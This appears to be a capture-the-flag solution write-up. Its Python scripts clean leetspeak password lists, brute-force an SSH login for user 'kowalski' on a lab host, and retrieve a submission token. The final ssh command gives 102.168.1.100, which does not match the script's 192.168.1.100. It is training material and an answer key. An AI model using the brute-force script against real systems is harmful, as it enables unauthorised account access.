# Dirty Work Solution

### Part 1 - Analysis

Write the following script and run it three times, each time with a different password list as an argument.

```python
#!/usr/bin/python3

import argparse
import sys

def scrubList( wordList ):
    finalList = {}

    for word in wordList:
        #print( "Starting with: ", word )
        word = word.replace( '0', 'o' )
        word = word.replace( '1', 'l' )
        word = word.replace( '2', 'z' )
        word = word.replace( '3', 'e' )
        word = word.replace( '4', 'a' )
        word = word.replace( '5', 's' )
        word = word.replace( '7', 't' )
        word = word.replace( '8', 'b' )
        word = word.replace( '9', 'g' )
        fixedWord = ""
        for i in word:
            i = i.lower()
            if i in "abcdefghijklmnopqrstuvwxyz":
                fixedWord = fixedWord + i
        fixedWord = fixedWord.capitalize()
        if fixedWord in finalList:
            finalList[fixedWord] = finalList[fixedWord] + 1
        else:
            finalList[fixedWord] = 1
    return finalList

def main():
    print( "Sanitizing list." )
    filename = sys.argv[1]
    items = []
    f = open( filename, 'r' )
    print( "Opening", filename )
    for line in f:
        items.append( line.strip() )
    print( "Done reading." )
    f.close()

    # This is where the magic happens
    finalList = scrubList( items )

    print( finalList )

if __name__ == "__main__":
    if len( sys.argv ) != 2:
        print( "Bad usage. Must provide file name." )
    else:
        main()
```

The output will list words and appearance frequency. Write down all nine words (three from each category) that appear only once.

## **NOTE:** The following steps can only be performed in the hosted environment. 

### Part 2 - Attack

Write the following script to brute force the remote SSH system's password.

```python
#!/usr/bin/python3

import paramiko, sys, os, socket

global host, username, line

host = '192.168.1.100'
username = 'kowalski'

def ssh_connect( password, code = 0 ):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )

    try:
        ssh.connect( host, port=22, username=username, password=password )
    except paramiko.AuthenticationException:
        code = 1
    except socket.error:
        code = 2

    ssh.close()
    return code

def main():
    words = []
    a = ('','','')
    b = ('','','')
    c = ('','','')

    for i in a:
        for j in b:
            for k in c:
                words.append( ''.join( ( i, j, k ) ) )
                words.append( ''.join( ( i, k, j ) ) )
                words.append( ''.join( ( j, i, k ) ) )
                words.append( ''.join( ( j, k, i ) ) )
                words.append( ''.join( ( k, j, i ) ) )
                words.append( ''.join( ( k, i, j ) ) )

    attempt = 0
    for word in words:
        print( attempt, "Trying:", word )
        attempt = attempt + 1
        if ssh_connect( word ) == 0:
            print( word )
            quit()

if __name__ == "__main__":
    main()
```

For variables a, b, and c, fill in the nine empty strings with the words from Part 1. Keep themes together: All poets in one tuple, all elements in another, and all constellations in the last. Run the script. It may take a few minutes. When it finds the password, it will print it to the terminal and then exit.

### Part 3 - Submission

Use the newly-discovered password to connect to the remote machine:

```ssh -l kowalski 102.168.1.100```

Then look at the contents of submission.txt to find the submission token. Type it into the gamespace page and submit.

```cat ~/submission.txt```
